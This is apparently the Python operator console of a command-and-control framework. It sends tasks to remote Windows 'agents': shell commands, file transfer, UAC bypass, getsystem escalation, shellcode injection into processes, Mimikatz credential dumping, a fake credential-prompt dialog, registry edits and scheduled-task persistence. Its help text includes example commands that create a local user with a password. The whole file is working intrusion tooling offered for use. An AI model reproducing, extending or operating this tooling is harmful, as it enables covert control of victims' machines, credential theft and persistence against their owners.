import base64
import json
import sys
import requests
from pathlib import Path
from pprint import pprint
import toml

mysettings_server = ''

try:
    data = toml.load("config.toml")
    mysettings_server = data['settings']['server']
except:
    print("")

menu = 1
prompt = "> "
currentAgent = ""

# Define an enumeration subclass Enum
from enum import Enum

class errorcode(Enum):
    success = 0
    warning = 1
    invalid = 2

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8 # The upload cmd is from the Server's perspective. Therefore, your Client will perform the action as a download.
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    GetSystem = 13
    Screenshot = 14
    Sleep = 15
    Mimikatz = 16
    Copy = 17
    Move = 18
    Delete = 19
    CreateKey = 20
    WriteValue = 21
    DelRegKey = 22
    RegDelValue = 23
    QueryKey = 24
    QueryValue = 25
    CreateScheduledTask = 26
    StartScheduledTask = 27
    Netstat = 28
    Ipconfig = 29
    MessageBox = 30
    Dir = 31
    PromptUserCreds = 32

base_commands = {
    "help" : "print this info",
    "agents" : "agents information",
    "quit" : "exit from the console"
}

agents_commands = {
    "list" : "list all agents",
    "dropdb" : "delete all data from the db",
    "use" : "connect to a specific agent",
    "help" : "print this info",
    "back" : "go back to the main menu",
    "quit" : "same as back"
}

agent_interactive_commands = {
    "task" : "specific task details",
    "history" : "task history",
    "sysinfo" : "basic agent details",
    "shell" : "execute os command",
    "ps": "print list of running processes",
    "pwd" : "print current working directory",
    "dir" : "print contents of current working directory",
    "cd" : "change directory",
    "upload": "upload a file to the Server. ex: upload /tmp/test.txt C:\\test.txt",
    "download": "download a file. ex download C:\\LargeFiles\\100MB.zip",
    "listprivs": "lists current privs of the client",
    "setpriv": "enable or disable a priv. ex: setpriv SeDebug enabled",
    "bypassuac": "execute command in high integrity by bypassing UAC using several methods (1 = fodhelper). ex: bypassuac 1 'net user user Password1! /add'",
    "getsystem": "execute command as SYSTEM user using several methods (1 = pipe). ex: getsystem 1 'net user user Password1! /add'",
    "screenshot": "take a picture of the screen",
    "sleep": "modify client sleep/jitter settings. ex: sleep <seconds> <jitter-max> <jitter-min (optional, default 25%)>. Ex: sleep 10 40 30",
    "scinject": "remote shellcode injection. ex: scinject [path/shellcode] [pid]",
    "getuid": "get user info",
    "mimikatz": "execute a series of mimikatz commands. separate commands by ';' and the last command must be exit. ex: mimikatz standard::coffee;standard::version;standard::answer;exit",
    "copy" : 'copies a file or folder from one location to another. filepaths must be enclosed by double quotes. ex: "C:\\Users\\user\\test.txt" "C:\\Users\\user\\test-copy.txt"',
    "move" : "move a file from one location to another. ex: move C:\\Users\\user\\test.txt C:\\Users\\user\\test1.txt",
    "delete" : "delete a file with filepath supplied. ex: delete C:\\Users\\user\\test.txt",
    "createkey" : "creates a registry key (container) at the specified path. supports all five registry hives HKLM, HKCU, HKU, HKCR, HKCC. key must be in format HIVE:KEYPATH. ex: createkey HKLM:SOFTWARE\\Test",
    "writevalue" : 'creates or modifies a registry value at the specified key path. if the path does not exist, creates it. supports all five registry hives HKLM, HKCU, HKU, HKCR, HKCC. key must be in format HIVE:KEYPATH, and parameters must be enclosed by double quotes. fourth argument must be the data type to write: SZ (string), DWORD, QWORD, or BINARY. ex: writevalue "HKLM:SOFTWARE\\Test" "InstallPath" "C:\\ProgramFiles\\AppName\\app.exe" "SZ"',
    "delregkey" : "delete a registry key in HKLM. ex: delregkey SOFTWARE\\7-Zip\\blah",
    "regdelvalue" : "delete a value within a registry key in HKLM. ex: regdelvalue SOFTWARE\\7-Zip blah",
    "querykey" : "query a key in hive HKLM with querykey [key]. ex: querykey SOFTWARE\\Microsoft\\Cryptography",
    "queryvalue" : "query a value of a key in hive HKLM with queryvalue [key] [data]. ex: queryvalue SOFTWARE\\Microsoft\\Cryptography MachineGuid",    
    "createschedul-" : "create a scheduled task with createscheduledtask [name] [filepath]. ex: createscheduledtask WindowsAuto notepad.exe ", # shortened for prettify
    "startschedule-" : "start a created scheduled task with startscheduledtask [name]. ex: startscheduledtask WindowsAuto", # shortened for prettify
    "netstat" : "display current TCP and UDP connections",
    "ipconfig" : "display information regarding network adaptors",
    "messagebox" : 'displays a GUI messagebox to the current desktop session. args: bodyText, titleText, buttons, icon, and all arguments must be enclosed in double quotes. buttons and icon must be strings from here: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox. ex: messagebox "Do you wish to procede?" "Alert" "MB_YESNOCANCEL" "MB_ICONWARNING"',
    "promptusercre-" : 'displays a GUI alert to the current desktop session asking for credentials to be entered. Args: bodyText, titleText, and all arguments must be enclosed in double quotes. ex: promptusercreds "Enter Your Credentials to Procede" "Alert"', # shortened for prettify
    "help" : "print this info",
    "back" : "go back to the agents menu",
    "terminate": "kill agent",
    "resource": "run a cmds from a file. RC file local to the CLI. one cmd per line. ex: resource [cmds.rc]",
    "quit" : "same as back"
}

tasktype_mapping = {
    tasktype.Terminate: "Terminate",
    tasktype.Command: "Command",
    tasktype.Pwd: "Pwd",
    tasktype.ChangeDir: "ChangeDir",
    tasktype.Whoami: "Whoami",
    tasktype.PsList: "PsList",
    tasktype.Download: "Upload",
    tasktype.Upload: "Download",
    tasktype.ListPrivs: "ListPrivs",
    tasktype.SetPriv: "SetPrivs",
    tasktype.RemoteInject: "RemoteInject",
    tasktype.BypassUAC: "BypassUAC",
    tasktype.GetSystem: "GetSystem",
    tasktype.Screenshot: "Screenshot",
    tasktype.Sleep: "Sleep",
    tasktype.Mimikatz: "Mimikatz",
    tasktype.Copy: "Copy",
    tasktype.Move: "Move",
    tasktype.Delete: "Delete",
    tasktype.CreateKey: "CreateKey",
    tasktype.WriteValue: "WriteValue",
    tasktype.DelRegKey: "DelRegKey",
    tasktype.RegDelValue: "RegDelValue",
    tasktype.QueryKey: "QueryKey",
    tasktype.QueryValue: "QueryValue",
    tasktype.CreateScheduledTask: "CreateScheduledTask",
    tasktype.StartScheduledTask: "StartScheduledTask",
    tasktype.Netstat: "Netstat",
    tasktype.Ipconfig: "Ipconfig",
    tasktype.MessageBox: "MessageBox",
    tasktype.Dir: "Dir",
    tasktype.PromptUserCreds: "PromptUserCreds",
}

boilerplate_sRDI_modules = [
    "ListPrivs",
    "BypassUAC",
    "Screenshot",
    "GetSystem",
    "Copy",
    "Move",
    "Delete",
    "CreateKey",
    "WriteValue",
    "DelRegKey",
    "RegDelValue",
    "QueryKey",
    "QueryValue",
    "CreateScheduledTask",
    "StartScheduledTask",
    "Netstat",
    "Ipconfig",
    "MessageBox",
    "PromptUserCreds",
    "Mimikatz",
]


boilerplate_sRDI_modules_lower = [m.lower() for m in boilerplate_sRDI_modules]

def print_task_type(task_type):
    if isinstance(task_type, int):
        task_type = next((t for t in tasktype if t.value == task_type), None)
    print(tasktype_mapping.get(task_type, "Unknown"))
        
def api_task_details(task_id):
    global mysettings_server
    url = "http://{}/admin/api/task/{}".format(mysettings_server,task_id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_task_history(id):
    global mysettings_server
    url = "http://{}/admin/api/agent_task/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_get_agent(id):
    global mysettings_server
    url = "http://{}/admin/api/agent/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None
            
def api_agents():
    global mysettings_server
    url = "http://{}/admin/api/agents".format(mysettings_server)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_dropdb():
    global mysettings_server
    url = "http://{}/admin/api/dropdb".format(mysettings_server)
    r = requests.get(url,timeout=300)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_send_task(task,timeout=60):
    global mysettings_server
    url = "http://{}/admin/api/task".format(mysettings_server)
    r = requests.post(url,json=task,timeout=timeout)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def print_agents(agents):
    print("--------------------------------------------------")
    if agents == None:
        print("Cant connect to server")
    elif len(agents) == 0:
        print("\t\tNo agents")
    else:
        for agent in agents:
            print_agent_details(agent)
            if len(agents) > 1:    
                print("-------")
    print("--------------------------------------------------")

def decode_base64_to_utf8(data):
    try:
        # Attempt to decode the base64 string
        decoded_data = base64.b64decode(data)
        # Attempt to decode the byte string to UTF-8
        utf8_string = decoded_data.decode('utf-8')
        return utf8_string
    except (base64.binascii.Error, UnicodeDecodeError):
        # If an error occurs, return the data. It's already decoded
        return data
        
def print_task_details(task):
    if task == None:
        print("Cant connect to server")
    else:
        try:
            print("")
            print("ID\t\t:",task['id'])
            print("Type\t\t: ",end="")
            print_task_type(task['type'])
            print("Created\t\t:",task['created'])
            print("Updated\t\t:",task['updated'])
            print("Input\t\t:",task['input'][:512])
            if task['status'] == 1:
                print("Status\t\t: Queued")
            elif task['status'] == 2:
                print("Status\t\t: Pending")
            elif task['status'] == 3:
                print("Status\t\t: Executing")
            elif task['status'] == 4:
                print("Status\t\t: Complete")
                output = decode_base64_to_utf8(task['result'])
                if len(output) > 1024:
                    print("Result\t\t:\n",output[:32768])
                else:
                    print("Result\t\t:\n",output)
            elif task['status'] == 5:
                print("Status\t\t: Failed")
                output = decode_base64_to_utf8(task['result'])
                if len(output) > 1024:
                    print("Result\t\t:\n",output[:16384])
                else:
                    print("Result\t\t:\n",output)
            elif task['status'] == 6:
                print("Status\t\t: Not Supported")
        except Exception as e:
            print(f"Unknown task or other error: {e}")

def print_task_history(task_history):
    print("--------------------------------------------------")
    if task_history == None:
        print("Cant connect to server")
    elif len(task_history) == 0:
        print("\t\tNo tasks")
    else:
        for task in task_history:
            print("---")
            print("ID\t\t:",task['id'])
            print("Type\t\t: ",end="")
            print_task_type(task['type'])
            print("Input\t\t:",task['input'][:75])
            if task['status'] == 1:
                print("Status\t\t: Queued")
            elif task['status'] == 2:
                print("Status\t\t: Pending")
            elif task['status'] == 3:
                print("Status\t\t: Executing")
            elif task['status'] == 4:
                print("Status\t\t: Completed")
            elif task['status'] == 5:
                print("Status\t\t: Failed")
            elif task['status'] == 6:
                print("Status\t\t: Not Supported")
            print("Created\t\t:",task['created'])
            print("Updated\t\t:",task['updated'])
    print("--------------------------------------------------")

## agent is a json object
def print_agent_details(agent):
    if agent == None:
        print("Cant connect to server")
    else:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        print("Integrity\t:",agent['integrity'])
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])
        print("-------")


def agent_send_host_download_file_exec(type,path,input):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'type': type,
                    'input_args':input
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file_exec".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_host_download_file(path,dst_path):
    json_data = {   'agent_id': current_agent, 
                    'path': path, 
                    'dst_path':dst_path
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file".format(mysettings_server)
    r = requests.post(url,json=json_data,timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_cmd(type = 1, input = ''):
    json_data = {   'agent_id': current_agent, 
                    'input': input, 
                    'status': 1, 
                    'type': type
                }
    pprint(json_data)
    data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
    task = { 'data': data }
    result = api_send_task(task)
    pprint(result)

def agent_send_terminate_cmd():
    agent_send_cmd(tasktype.Terminate.value)

def agent_send_shell_cmd(shell_cmd):
    agent_send_cmd(tasktype.Command.value,shell_cmd)

def agent_send_pwd_cmd():
    agent_send_cmd(tasktype.Pwd.value)

def agent_send_cd_cmd(cd_dir):
    agent_send_cmd(tasktype.ChangeDir.value,cd_dir)

def agent_send_dir_cmd():
    agent_send_cmd(tasktype.Dir.value)

def agent_send_getuid_cmd():
    agent_send_cmd(tasktype.Whoami.value)

def agent_send_ps_cmd():
    agent_send_cmd(tasktype.PsList.value)

def agent_send_download_cmd(srv_path,dst_path):
    agent_send_host_download_file(srv_path,dst_path)
    
def agent_send_upload_cmd(uploadpath):
    agent_send_cmd(tasktype.Upload.value,uploadpath)

def agent_send_sleep_cmd(input):
    agent_send_cmd(tasktype.Sleep.value,input)

def agent_task_details(task_id):
    task = api_task_details(task_id)
    print_task_details(task)

def agent_history():
    task_history = api_task_history(current_agent)
    print_task_history(task_history)
        
def agent_sysinfo():
    agent = api_get_agent(current_agent)
    if "id" in agent:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        if agent['integrity'] == 3:
            print("Integrity\t:",agent['integrity']," - Medium")
        elif agent['integrity'] == 4:
            print("Integrity\t:",agent['integrity']," - High")
        elif agent['integrity'] == 5:
            print("Integrity\t:",agent['integrity']," - SYSTEM")
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])

def use_agent(inputstr):
    global current_agent
    global menu
    global prompt
    agent_json = api_get_agent(inputstr)
    if agent_json == None:
        print("Cant connect to server")
    elif "id" in agent_json:
        menu = 3
        current_agent = inputstr
        prompt = inputstr + " > "
        print_agent_details(agent_json)
    else:
        print("invalid agent_id")

def list_agents():
    agents = api_agents()
    print_agents(agents)

def set_agent_menu():
    global menu
    global prompt
    menu = 2
    prompt = "agents > "

def set_main_menu():
    global menu
    global prompt
    menu = 1
    prompt = "> "

def print_main_menu_help():
    for i in base_commands :
        print(i,"\t:", base_commands[i])

def print_agents_help():
    for i in agents_commands:
        print(i,"\t:", agents_commands[i])

def print_agent_interactive_help():
    for i in agent_interactive_commands:
        if(len(str(i)) >= 7):
            print(i,"\t:", agent_interactive_commands[i])
        else:
            print(i,"\t\t:", agent_interactive_commands[i])

#
# main menu 1
# agents 2
# interactive agent 3
#
def parseInput(inputstr):
    if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
        if menu == 1:
            sys.exit(0)
        elif menu == 2:
            set_main_menu()
        elif menu == 3: 
            set_agent_menu()
    elif inputstr == "help":
        if menu == 1:
            print_main_menu_help()
            print("")
        elif menu == 2:
            print_agents_help()
            print("")
        elif menu == 3:
            print_agent_interactive_help()
            print("")   
        else:
            print("")
    elif inputstr == "agents":
        set_agent_menu()
    elif menu == 2:
        if inputstr == "list":
            list_agents()
        if inputstr == "dropdb":
            api_dropdb()
        elif inputstr.startswith("use "):
            agent_id = inputstr.replace('use ', '')
            use_agent(agent_id)
    elif menu == 3:
        if inputstr == "sysinfo":
            agent_sysinfo()
        elif inputstr == "terminate":
            agent_send_terminate_cmd()
        elif inputstr.startswith("shell "):
            shell_cmd = inputstr.replace('shell ', '')
            agent_send_shell_cmd(shell_cmd)
        elif inputstr == "pwd":
            agent_send_pwd_cmd()
        elif inputstr == "getuid" or inputstr == "whoami":
            agent_send_getuid_cmd()
        elif inputstr == "ps":
            agent_send_ps_cmd()
        elif inputstr.startswith("cd "):
            cd_dir = inputstr.replace('cd ', '')
            agent_send_cd_cmd(cd_dir)
        elif inputstr == "dir":
            agent_send_dir_cmd()
        ##
        ## we flip the perspective here for upload and download
        ##
        elif inputstr.startswith("download "):
            upload_path = inputstr.replace('download ', '')
            agent_send_upload_cmd(upload_path)
        elif inputstr.startswith("upload "):
            uploadfile_input = inputstr.replace('upload ', '')
            srv_path = uploadfile_input.split(" ")[0]
            dst_path = uploadfile_input.split(" ")[-1]
            agent_send_download_cmd(srv_path,dst_path) 
        elif inputstr.startswith("setpriv "):
            setpriv_cmd = inputstr.replace('setpriv ', '')
            priv = setpriv_cmd.split(" ")[0]
            state = setpriv_cmd.split(" ")[-1]
            if state == "enabled" or state == "disabled":
                priv = priv + " " + state
                setpriv_dll_path = "cli\\modules\\setpriv\\setpriv_x64.dll"
                agent_send_host_download_file_exec(tasktype.SetPriv.value, setpriv_dll_path, priv)
                # agent_send_setpriv_cmd(priv)
            else:
                print("invalid state. state should be enabled or disabled")
        elif inputstr.startswith("sleep "):
            sleep_options = inputstr.replace('sleep ', '')
            agent_send_sleep_cmd(sleep_options)
        elif inputstr.startswith("scinject "):
            scinject_cmd = inputstr.replace('scinject ', '')
            file = scinject_cmd.split(" ")[0]
            processOrpid = scinject_cmd.split(" ")[1]
            agent_send_host_download_file_exec(tasktype.RemoteInject.value,file,processOrpid)
        elif inputstr.lower().startswith(tuple(boilerplate_sRDI_modules_lower)):
            matched_prefix = next(
                (orig for orig in boilerplate_sRDI_modules
                if inputstr.lower().startswith(orig.lower())),
                None
            )
            if matched_prefix:
                module_cmd = inputstr[len(matched_prefix):].strip()
                module_dll_path = f"cli\\modules\\{matched_prefix.lower()}\\{matched_prefix.lower()}_x64.dll"
                module_type = getattr(tasktype, matched_prefix).value
                agent_send_host_download_file_exec(module_type, module_dll_path, module_cmd)
        elif inputstr.startswith("resource "):
            autoruncmds = []
            resource_cmd = inputstr.replace('resource ', '')
            file = resource_cmd.split(" ")[0]
            pathfile = Path(file)
            if pathfile.is_file():
                f=open(file,"r")
                for line in f:
                    cmd = line.strip()
                    if(len(cmd) > 0):
                        autoruncmds.append(cmd)
                f.close()
                for cmd in autoruncmds:
                    parseInput(cmd)
        elif inputstr == "history" or inputstr == "tasks":
            agent_history()
        elif inputstr.startswith("task "):
            task_id = inputstr.replace('task ', '')
            print(task_id)
            agent_task_details(task_id)

while True:
    try:
        inputstr = str(input(prompt))
        print("")
        parseInput(inputstr)
    except TypeError as err:
        print("error: {}".format(err))
    except KeyboardInterrupt as err:
        sys.exit()
    except EOFError as err:
        sys.exit()
